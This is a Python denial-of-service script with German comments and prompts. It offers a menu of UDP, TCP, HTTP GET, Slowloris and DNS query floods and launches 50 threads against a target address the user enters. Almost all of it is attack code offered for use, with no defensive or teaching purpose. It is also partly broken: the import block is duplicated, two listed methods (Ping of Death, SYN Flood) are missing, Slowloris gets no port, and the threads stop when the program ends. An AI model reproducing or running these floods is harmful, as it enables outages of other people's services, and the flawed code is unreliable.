import os
import random
import socket
import requests
from datetime import datetime
import threading

# Funktion zum Setzen der Farben
def print_colored(text, color="pink", background="white"):
    color_codes = {
        "pink": "\033[38;5;13m",
        "white": "\033[48;5;15m",
        "reset": "\033[0m"
    }
    background_codes = {
        "white": "\033[48;5;15m",
        "black": "\033[48;5;0m",
        "reset": "\033[0m"
    }
    print(f"{background_codes[background]}{color_codes[color]}{text}{color_codes['reset']}{background_codes['reset']}")

# Begrüßung
os.system("clear")
os.system("figlet -f slant Attack Script")  # Beispiel Schriftart 'slant'

# Farben beim Starten
print_colored("Willkommen zum Angriffsskript!", color="pink", background="white")
print_colored("Bitte wählen Sie eine Angriffsmethode:", color="pink", background="white")
print_colored("1 - UDP Flood", color="pink", background="white")
print_colored("2 - TCP Flood", color="pink", background="white")
print_colored("3 - POD Flood (Ping of Death)", color="pink", background="white")
print_colored("4 - SYN Flood", color="pink", background="white")
print_colored("5 - HTTP GET Flood (rootfrei)", color="pink", background="white")
print_colored("6 - Slowloris Attack (rootfrei)", color="pink", background="white")
print_colored("7 - DNS Query Flood (rootfrei)", color="pink", background="white")

import os
import socket
import random
import requests
from datetime import datetime
import threading

# Funktion zum Erstellen von Threads
def thread_attack(func, *args):
    thread = threading.Thread(target=func, args=args)
    thread.daemon = True
    thread.start()

# UDP Flood verstärken
def udp_flood(ip, port):
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    udp_bytes = random._urandom(1490)
    while True:
        sock.sendto(udp_bytes, (ip, port))

# TCP Flood verstärken
def tcp_flood(ip, port):
    while True:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        try:
            sock.connect((ip, port))
            sock.send(random._urandom(1024))
        except:
            pass
        finally:
            sock.close()

# HTTP GET Flood verstärken
def http_get_flood(target):
    while True:
        try:
            requests.get(target)
        except:
            pass

# Slowloris verstärken
def slowloris(ip, port):
    sockets = []
    for _ in range(100):
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(5)
        sock.connect((ip, port))
        sock.send(b"GET / HTTP/1.1\r\n")
        sockets.append(sock)
    while True:
        for sock in sockets:
            sock.send(b"X-a: Keep-alive\r\n")

# DNS Query Flood verstärken
def dns_flood(ip):
    server = (ip, 53)  # Port 53 für DNS
    query = b"\x12\x34\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00\x07example\x03com\x00\x00\x01\x00\x01"
    while True:
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.sendto(query, server)

# Auswahl der Methode
method = input("Wähle die Angriffsmethode (1/2/3/4/5/6/7): ")
ip = input("Ziel-IP-Adresse (oder Domain für HTTP/DNS): ")

# Port nur für bestimmte Methoden anfragen
port = None
if method in ["1", "2", "4"]:
    port = int(input("Port (z. B. 80): "))

# Methode basierend auf Auswahl verstärken
if method == "1":
    print("Starte UDP-Flood...")
    for _ in range(50):  # Starte 50 Threads für parallele Angriffe
        thread_attack(udp_flood, ip, port)

elif method == "2":
    print("Starte TCP-Flood...")
    for _ in range(50):
        thread_attack(tcp_flood, ip, port)

elif method == "5":
    print("Starte HTTP GET Flood...")
    target_url = f"http://{ip}"
    for _ in range(50):
        thread_attack(http_get_flood, target_url)

elif method == "6":
    print("Starte Slowloris...")
    for _ in range(50):
        thread_attack(slowloris, ip, port)

elif method == "7":
    print("Starte DNS Query Flood...")
    for _ in range(50):
        thread_attack(dns_flood, ip)

else:
    print("Ungültige Auswahl. Das Programm wird beendet.")
